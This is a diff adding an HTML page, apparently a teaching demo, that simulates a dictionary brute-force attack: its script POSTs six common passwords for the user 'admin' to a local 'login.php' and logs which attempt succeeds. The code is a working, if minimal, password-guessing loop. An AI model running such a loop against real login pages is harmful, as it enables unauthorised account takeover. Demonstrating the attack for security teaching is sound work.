@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Brute Force Attack Simulation</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+        .log {
+            border: 1px solid #ccc;
+            padding: 10px;
+            height: 300px;
+            overflow-y: scroll;
+            background-color: #f9f9f9;
+            margin-top: 20px;
+        }
+        .log-entry {
+            padding: 5px 0;
+        }
+        .success {
+            color: green;
+        }
+        .failure {
+            color: red;
+        }
+    </style>
+</head>
+<body>
+    <h1>Brute Force Attack Simulation</h1>
+    <button id="startAttack">Start Brute-Force Attack</button>
+    <div class="log" id="log"></div>
+
+    <script>
+        const dictionary = [
+            'password123', 'admin', '123456', 'supersecret', 'qwerty', 'supersecret123'
+        ];
+
+        const targetURL = 'login.php'; // Endpoint to attack
+        const username = 'admin'; // Target username
+
+        async function bruteForce() {
+            const log = document.getElementById('log');
+            log.innerHTML = ''; // Clear the log before starting
+
+            for (let i = 0; i < dictionary.length; i++) {
+                const password = dictionary[i];
+                
+                const formData = new FormData();
+                formData.append('username', username);
+                formData.append('password', password);
+
+                // Send POST request to the server
+                const response = await fetch(targetURL, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                // Get the response text (whether login is successful or not)
+                const result = await response.text();
+
+                // Log the attempt
+                const logEntry = document.createElement('div');
+                logEntry.classList.add('log-entry');
+                
+                if (result.includes("Login successful!")) {
+                    logEntry.innerHTML = `Attempt with password "${password}" <span class="success">Succeeded</span>`;
+                    log.appendChild(logEntry);
+                    break; // Stop after successful login
+                } else {
+                    logEntry.innerHTML = `Attempt with password "${password}" <span class="failure">Failed</span>`;
+                    log.appendChild(logEntry);
+                }
+
+                // Scroll to the bottom of the log
+                log.scrollTop = log.scrollHeight;
+
+                // Delay between attempts (for demonstration purposes)
+                await new Promise(resolve => setTimeout(resolve, 1000));
+            }
+        }
+
+        // Start the brute-force attack when the button is clicked
+        document.getElementById('startAttack').addEventListener('click', () => {
+            bruteForce();
+        });
+    </script>
+</body>
+</html>
